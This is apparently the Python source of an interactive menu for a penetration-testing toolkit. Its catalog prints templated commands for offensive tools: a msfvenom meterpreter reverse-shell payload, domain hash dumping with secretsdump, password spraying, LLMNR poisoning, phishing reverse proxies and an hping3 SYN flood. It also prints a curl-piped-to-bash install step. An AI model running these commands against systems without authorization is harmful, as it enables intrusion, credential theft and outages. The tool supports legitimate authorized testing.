"""Interactive CLI menu for pentest-tools.

The menu is a lightweight launcher for users who want to browse categories,
inspect tool suggestions, and generate the exact command they should run.
It is designed for authorized work only and does not silently execute
assessments.

Usage:
    pentest-tools menu

Commands inside the menu:
    1, 2, 3...    select a category
    /<term>       search across categories and tools
    t <tag>       filter by tag (web, ad, cloud, mobile, ...)
    r             recommend agents for a freeform task
    d             run install audit
    s             show installed agents and version
    h or ?        help
    q             quit
    99            back

Selecting a tool prints the command to run, with placeholders the user can
fill in. Explicit execution always goes through `pentest-tools start ...`
with scope confirmation.
"""

from __future__ import annotations

import os
import shutil
import sys
from typing import Any

# ─── catalog ────────────────────────────────────────────────────────────
# Source-of-truth menu structure. Categories map to specialized agents and
# the underlying tool wrappers they drive. Tags are used for `t <tag>`
# filtering.

MENU_CATEGORIES: list[dict[str, Any]] = [
    {
        "id": 1,
        "name": "Reconnaissance",
        "agent": "recon",
        "tags": ["recon", "osint", "discovery"],
        "tools": [
            ("nmap", "Network mapper", "nmap -sV -sC <target>"),
            ("masscan", "Internet-scale port scanner", "masscan -p1-65535 --rate=1000 <target>"),
            ("rustscan", "Fast port scan, pipes to nmap", "rustscan -a <target> -- -sV -sC"),
            ("subfinder", "Passive subdomain enumeration", "subfinder -d <domain> -silent"),
            ("amass", "Asset discovery (passive)", "amass enum -passive -d <domain>"),
            ("httpx", "HTTP probe + tech fingerprint", "httpx -l hosts.txt -title -tech-detect"),
        ],
    },
    {
        "id": 2,
        "name": "Web Application Testing",
        "agent": "web",
        "tags": ["web", "appsec", "owasp"],
        "tools": [
            ("ffuf", "Fast web fuzzer", "ffuf -u https://<target>/FUZZ -w wordlist.txt"),
            ("feroxbuster", "Recursive content discovery", "feroxbuster -u https://<target>"),
            ("nuclei", "Template-based vulnerability scanner", "nuclei -u https://<target> -severity critical,high"),
            ("sqlmap", "SQL injection automation", "sqlmap -u 'https://<target>?id=1' --batch"),
            ("dalfox", "XSS scanner", "dalfox url 'https://<target>?q=test'"),
            ("commix", "Command injection automation", "commix --url='https://<target>?p=v' --batch"),
            ("nikto", "Web server vuln scanner", "nikto -h https://<target>"),
        ],
    },
    {
        "id": 3,
        "name": "Active Directory",
        "agent": "ad",
        "tags": ["ad", "windows", "kerberos"],
        "tools": [
            ("crackmapexec", "AD enumeration and lateral movement", "crackmapexec smb <dc> -u users.txt -p 'Spring2026!'"),
            ("netexec (nxc)", "Modern crackmapexec successor", "nxc smb <dc> -u <user> -p <pass> --pass-pol"),
            ("impacket-secretsdump", "Hash dump from DC", "impacket-secretsdump '<domain>/<user>:<pass>@<dc>' -just-dc"),
            ("kerbrute", "Fast Kerberos username/password brute", "kerbrute passwordspray -d <domain> --dc <dc> users.txt 'Spring2026!'"),
            ("certipy", "AD CS abuse", "certipy find -u <user>@<domain> -p <pass>"),
            ("bloodhound-python", "AD graph collection", "bloodhound-python -d <domain> -u <user> -p <pass> -c All"),
            ("responder", "LLMNR/NBT-NS poisoning", "sudo responder -I eth0 -wrf"),
        ],
    },
    {
        "id": 4,
        "name": "Cloud Security",
        "agent": "cloud",
        "tags": ["cloud", "aws", "azure", "gcp", "k8s"],
        "tools": [
            ("prowler", "AWS/Azure/GCP misconfig scanner", "prowler aws"),
            ("scoutsuite", "Multi-cloud security audit", "scout aws --report-dir ./scout-out"),
            ("trivy", "Container + IaC vulnerability scan", "trivy image <image>:<tag>"),
            ("kube-hunter", "Kubernetes pen-test", "kube-hunter --remote <cluster-ip>"),
            ("kube-bench", "K8s CIS benchmark", "kube-bench"),
            ("pacu", "AWS exploitation framework", "pacu"),
        ],
    },
    {
        "id": 5,
        "name": "Mobile",
        "agent": "mobile",
        "tags": ["mobile", "android", "ios"],
        "tools": [
            ("frida", "Runtime instrumentation", "frida -U -l hook.js -f com.target.app"),
            ("objection", "Frida-powered runtime exploration", "objection -g com.target.app explore"),
            ("apktool", "APK reverse engineering", "apktool d app.apk"),
            ("jadx", "Android DEX decompilation", "jadx-gui app.apk"),
            ("mobsf", "Mobile Security Framework", "mobsfscan ./apk_path"),
        ],
    },
    {
        "id": 6,
        "name": "Wireless",
        "agent": "wireless",
        "tags": ["wireless", "wifi", "wpa", "bluetooth"],
        "tools": [
            ("aircrack-ng", "WPA/WPA2 capture + crack", "airodump-ng wlan0mon"),
            ("hcxdumptool", "PMKID capture", "sudo hcxdumptool -i wlan0mon -o capture.pcapng"),
            ("hcxtools", "Convert captures to hashcat", "hcxpcapngtool -o hash.22000 capture.pcapng"),
            ("bettercap", "Layer 2/3 MITM and recon", "sudo bettercap -iface wlan0"),
            ("wifite", "Automated wireless audit", "sudo wifite"),
        ],
    },
    {
        "id": 7,
        "name": "Credentials and Hashes",
        "agent": "credential-tester",
        "tags": ["creds", "passwords", "hashes", "cracking"],
        "tools": [
            ("hashcat", "GPU password cracker", "hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule"),
            ("john", "John the Ripper", "john --wordlist=rockyou.txt hashes.txt"),
            ("hydra", "Online brute force", "hydra -l <user> -P wordlist.txt ssh://<target>"),
            ("medusa", "Alternative online brute force", "medusa -h <target> -u <user> -P wordlist.txt -M ssh"),
            ("cewl", "Site-scraped wordlist", "cewl <target> -d 3 -m 5 -w site.txt"),
            ("cupp", "Profile-based wordlist", "cupp -i"),
            ("hashid", "Hash type identifier", "hashid '<hash>'"),
            ("haiti", "Hash type identifier (modern)", "haiti '<hash>'"),
        ],
    },
    {
        "id": 8,
        "name": "Exploitation",
        "agent": "exploit_chain",
        "tags": ["exploit", "metasploit", "payload"],
        "tools": [
            ("msfvenom", "Payload generation", "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lhost> LPORT=443 -f exe -o payload.exe"),
            ("msfconsole", "Metasploit console", "msfconsole -q"),
            ("routersploit", "Router exploitation framework", "rsf.py"),
            ("commix", "Command injection automation", "commix --url='<url>'"),
            ("evil-winrm", "Windows post-exploitation shell", "evil-winrm -i <target> -u <user> -p <pass>"),
        ],
    },
    {
        "id": 9,
        "name": "Reverse Engineering",
        "agent": "reverse-engineer",
        "tags": ["re", "binary", "static"],
        "tools": [
            ("ghidra", "NSA's open RE suite", "ghidra"),
            ("radare2", "CLI reverse engineering", "r2 -A <binary>"),
            ("jadx", "Java/Android decompiler", "jadx-gui app.apk"),
            ("binwalk", "Firmware extraction", "binwalk -e firmware.bin"),
            ("objdump", "GNU disassembler", "objdump -d <binary>"),
            ("readelf", "ELF inspection", "readelf -a <binary>"),
        ],
    },
    {
        "id": 10,
        "name": "Forensics",
        "agent": "forensics-analyst",
        "tags": ["forensics", "dfir"],
        "tools": [
            ("volatility3", "Memory forensics", "vol -f memory.dump windows.pslist"),
            ("exiftool", "Metadata extraction", "exiftool <file>"),
            ("foremost", "File carving", "foremost -i image.dd -o foremost-out"),
            ("yara", "Rule-based pattern matching", "yara rules.yar <file>"),
        ],
    },
    {
        "id": 11,
        "name": "Steganography",
        "agent": "ctf-solver",
        "tags": ["stego", "ctf"],
        "tools": [
            ("zsteg", "PNG/BMP LSB analysis", "zsteg -a <file.png>"),
            ("steghide", "Image/audio passphrase stego", "steghide extract -sf <file>"),
            ("stegseek", "Brute-force steghide passphrases", "stegseek <file.jpg> rockyou.txt"),
            ("pngcheck", "PNG chunk validation", "pngcheck -v <file.png>"),
        ],
    },
    {
        "id": 12,
        "name": "OSINT",
        "agent": "osint-collector",
        "tags": ["osint", "recon"],
        "tools": [
            ("theHarvester", "Email/subdomain harvest", "theHarvester -d <domain> -b all"),
            ("sherlock", "Username search across sites", "sherlock <username>"),
            ("holehe", "Email-based account discovery", "holehe <email>"),
            ("maigret", "Username search (modern)", "maigret <username>"),
            ("dnstwist", "Lookalike domain discovery", "dnstwist --registered <domain>"),
        ],
    },
    {
        "id": 13,
        "name": "Phishing Infrastructure",
        "agent": "phishing-operator",
        "tags": ["phishing", "se", "social"],
        "tools": [
            ("gophish", "Open-source phishing framework", "./gophish"),
            ("evilginx", "Reverse-proxy MITM phishlet platform", "evilginx -p ./phishlets/"),
            ("dnstwist", "Lookalike domain enumeration", "dnstwist --registered <domain>"),
            ("modlishka", "Reverse-proxy phishing alternative", "modlishka -config config.json"),
        ],
    },
    {
        "id": 14,
        "name": "Stress and DoS testing (authorized)",
        "agent": "vuln-scanner",
        "tags": ["dos", "stress", "resilience"],
        "_warn": "Stress testing only against authorized targets. Includes mandatory rate ramp and abort triggers.",
        "tools": [
            ("slowloris", "Layer-7 slow HTTP attack", "slowloris.py <target>"),
            ("goldeneye", "HTTP DoS test tool", "goldeneye <target>"),
            ("hping3", "TCP/IP packet crafter", "sudo hping3 -S --flood -p 80 <target>"),
        ],
    },
]


# ─── rendering helpers ──────────────────────────────────────────────────


def _color(s: str, code: str) -> str:
    if not sys.stdout.isatty() or os.environ.get("NO_COLOR"):
        return s
    return f"\033[{code}m{s}\033[0m"


def _has(cmd: str) -> bool:
    return shutil.which(cmd.split()[0]) is not None


def _render_main_menu() -> None:
    print()
    print(_color("pentest-tools", "1;36"))
    print(_color("interactive launcher for authorized testing", "2"))
    print()
    for cat in MENU_CATEGORIES:
        print(f"  {_color(str(cat['id']).rjust(2), '1;33')}  {cat['name']}")
    print()
    print(f"  {_color(' /', '1;33')}  search across categories and tools")
    print(f"  {_color(' t', '1;33')}  filter by tag (web, ad, cloud, mobile, ...)")
    print(f"  {_color(' r', '1;33')}  recommend agent for a task")
    print(f"  {_color(' d', '1;33')}  install audit (doctor)")
    print(f"  {_color(' s', '1;33')}  show installed agents")
    print(f"  {_color(' h', '1;33')}  help / cheatsheet")
    print(f"  {_color(' q', '1;33')}  quit")
    print()


def _render_category(cat: dict[str, Any]) -> None:
    print()
    print(_color(f"{cat['id']}. {cat['name']}", "1;36"))
    if cat.get("agent"):
        print(_color(f"   agent: {cat['agent']}", "2"))
    if cat.get("_warn"):
        print(_color(f"   ! {cat['_warn']}", "1;31"))
    print()
    for i, (name, desc, cmd) in enumerate(cat["tools"], start=1):
        installed = "✔" if _has(name.split()[0]) else "✘"
        col = "1;32" if installed == "✔" else "1;31"
        print(f"  {_color(str(i).rjust(2), '1;33')}  {_color(installed, col)}  {_color(name.ljust(20), '1')}  {_color(desc, '2')}")
        print(f"      {_color('→ ' + cmd, '36')}")
    print()
    print(f"  {_color('99', '1;33')}  back")
    print(f"  {_color(' q', '1;33')}  quit")
    print()


def _print_help() -> None:
    print()
    print(_color("Cheatsheet", "1;36"))
    print()
    print("  Numeric (1-N): open a category")
    print("  /term:         search across all categories")
    print("  t <tag>:       filter by tag (e.g. 't web' or 't ad')")
    print("  r:             recommend an agent (will print suggested commands)")
    print("  d:             run install audit equivalent (doctor.sh)")
    print("  s:             show installed agents and version")
    print("  99:            back to previous menu")
    print("  q:             quit")
    print()
    print(
        _color("Tip:", "1;32"),
        "Tools marked ✘ are not installed. Run",
        _color("install.sh --tools", "1;36"),
        "to install the underlying CLIs the engine drives.",
    )
    print()


def _search(term: str) -> None:
    term = term.strip().lower()
    if not term:
        return
    print()
    print(_color(f"Search: {term}", "1;36"))
    matches: list[tuple[str, str]] = []
    for cat in MENU_CATEGORIES:
        if term in cat["name"].lower():
            matches.append((cat["name"], f"category {cat['id']}"))
        for name, desc, _cmd in cat["tools"]:
            if term in name.lower() or term in desc.lower():
                matches.append((name, f"in {cat['name']} → {desc}"))
    if not matches:
        print(_color("  no matches", "2"))
    else:
        for name, where in matches:
            print(f"  {_color('•', '1;33')}  {_color(name.ljust(22), '1')}  {_color(where, '2')}")
    print()


def _filter_tag(tag: str) -> None:
    tag = tag.strip().lower()
    if not tag:
        return
    print()
    print(_color(f"Tag: {tag}", "1;36"))
    matches = [c for c in MENU_CATEGORIES if tag in [t.lower() for t in c.get("tags", [])]]
    if not matches:
        print(_color("  no matching categories", "2"))
        return
    for c in matches:
        print(f"  {_color(str(c['id']).rjust(2), '1;33')}  {c['name']}")
    print()


def _recommend(task: str) -> None:
    task_l = task.strip().lower()
    if not task_l:
        return
    print()
    print(_color(f"Recommendation for: {task}", "1;36"))
    # Simple keyword routing. Future: call the LLM if one is configured.
    keyword_map = [
        (("web", "http", "site", "url", "api"), 2, ["web", "api-security", "bug-bounty"]),
        (("subdomain", "recon", "dns", "scan"), 1, ["recon-advisor", "osint-collector"]),
        (("ad", "domain", "kerberos", "smb"), 3, ["ad-attacker", "credential-tester"]),
        (("aws", "cloud", "azure", "gcp", "k8s", "kubernetes"), 4, ["cloud-security"]),
        (("android", "ios", "apk", "ipa"), 5, ["mobile-pentester", "reverse-engineer"]),
        (("wifi", "wireless", "bluetooth"), 6, ["wireless-pentester"]),
        (("password", "hash", "crack", "credential"), 7, ["credential-tester"]),
        (("payload", "msfvenom", "shellcode"), 8, ["payload-crafter", "exploit-guide"]),
        (("ghidra", "reverse", "binary", "firmware"), 9, ["reverse-engineer"]),
        (("memory", "forensics", "dfir"), 10, ["forensics-analyst"]),
        (("stego", "image", "hidden"), 11, ["ctf-solver"]),
        (("osint", "username", "email", "person"), 12, ["osint-collector"]),
        (("phish", "evilginx", "gophish"), 13, ["phishing-operator", "social-engineer"]),
        (("ddos", "stress", "load", "resilience"), 14, ["vuln-scanner"]),
    ]
    matched = []
    for keywords, cat_id, agents in keyword_map:
        if any(k in task_l for k in keywords):
            matched.append((cat_id, agents))
    if not matched:
        print(_color("  no obvious match. Try /search or browse categories.", "2"))
        return
    for cat_id, agents in matched:
        cat = next(c for c in MENU_CATEGORIES if c["id"] == cat_id)
        print(f"  {_color('→', '1;33')}  category {cat_id}: {cat['name']}")
        for a in agents:
            print(f"     {_color('agent', '2')}  {a}")
    print()


def _doctor() -> None:
    """Run the install audit. Looks for the doctor.sh that ships with the
    agents repo (~/.pentest-tools/bin/doctor.sh after install.sh --global).
    Falls back to a minimal in-process check.
    """
    candidate = os.path.expanduser("~/.pentest-tools/bin/doctor.sh")
    if os.path.isfile(candidate):
        print()
        # subprocess instead of os.system: keeps shell metacharacters out
        # of the launch path even though `candidate` is currently a fixed
        # path (defense in depth: future contributors might make this user-driven).
        import subprocess
        subprocess.run([candidate, "--quiet"], check=False)
        print()
        return
    print()
    print(_color("doctor.sh not installed.", "1;33"))
    print("  Optional: install the companion pentest-tools-agents repo for the full tool audit:")
    print("    " + _color("curl -fsSL https://raw.githubusercontent.com/pentest-tools/pentest-tools-agents/main/install.sh | bash", "36"))
    print("  (Not required for pttools. Falling back to a minimal in-process check below.)")
    print()
    # Minimal fallback: scan the catalog
    total = 0
    present = 0
    for cat in MENU_CATEGORIES:
        for name, _desc, _cmd in cat["tools"]:
            total += 1
            if _has(name.split()[0]):
                present += 1
    print(f"  {_color(str(present) + '/' + str(total), '1;36')} tools detected in PATH")
    print()


def _show_status() -> None:
    print()
    try:
        with open(os.path.join(os.path.dirname(__file__), "..", "VERSION")) as fp:
            ver = fp.read().strip()
    except FileNotFoundError:
        ver = "unknown"
    print(f"  pentest-tools version: {_color(ver, '1;36')}")
    print(f"  agents catalog: {len(MENU_CATEGORIES)} categories, {sum(len(c['tools']) for c in MENU_CATEGORIES)} tools")
    print(f"  python: {sys.version.split()[0]}")
    print()


# ─── main loop ──────────────────────────────────────────────────────────


def run() -> int:
    """Entry point invoked by `pttools menu`."""
    while True:
        _render_main_menu()
        try:
            choice = input(_color("pentest-tools> ", "1;32")).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return 0
        if not choice:
            continue
        if choice in ("q", "quit", "exit"):
            return 0
        if choice in ("h", "?", "help"):
            _print_help()
            continue
        if choice == "d":
            _doctor()
            continue
        if choice == "s":
            _show_status()
            continue
        if choice.startswith("/"):
            _search(choice[1:])
            continue
        if choice.startswith("t "):
            _filter_tag(choice[2:])
            continue
        if choice == "r":
            try:
                task = input(_color("describe the task> ", "1;32"))
            except (EOFError, KeyboardInterrupt):
                print()
                continue
            _recommend(task)
            continue
        if choice.isdigit():
            cat_id = int(choice)
            cat = next((c for c in MENU_CATEGORIES if c["id"] == cat_id), None)
            if not cat:
                print(_color("  unknown category", "1;31"))
                continue
            _category_loop(cat)
            continue
        print(_color("  unknown command. Type 'h' for help.", "1;31"))
    return 0


def _category_loop(cat: dict[str, Any]) -> None:
    while True:
        _render_category(cat)
        try:
            choice = input(_color(f"{cat['name'].lower()}> ", "1;32")).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if choice in ("q", "quit", "exit"):
            sys.exit(0)
        if choice == "99" or choice in ("b", "back"):
            return
        if not choice:
            continue
        # Return shows command examples so user can copy-paste with confidence.
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(cat["tools"]):
                name, desc, cmd = cat["tools"][idx]
                print()
                print(_color(f"{name}", "1;36"), "—", desc)
                print(_color("  command:", "1;33"), cmd)
                installed = _has(name.split()[0])
                if not installed:
                    print(_color("  status:", "1;33"), _color("not installed", "1;31"))
                    print(_color("  install:", "1;33"), _color("install.sh --tools", "36"), "(or per the doctor.sh hint)")
                else:
                    print(_color("  status:", "1;33"), _color("installed", "1;32"))
                print()
                continue
        print(_color("  unknown choice", "1;31"))


if __name__ == "__main__":
    sys.exit(run())
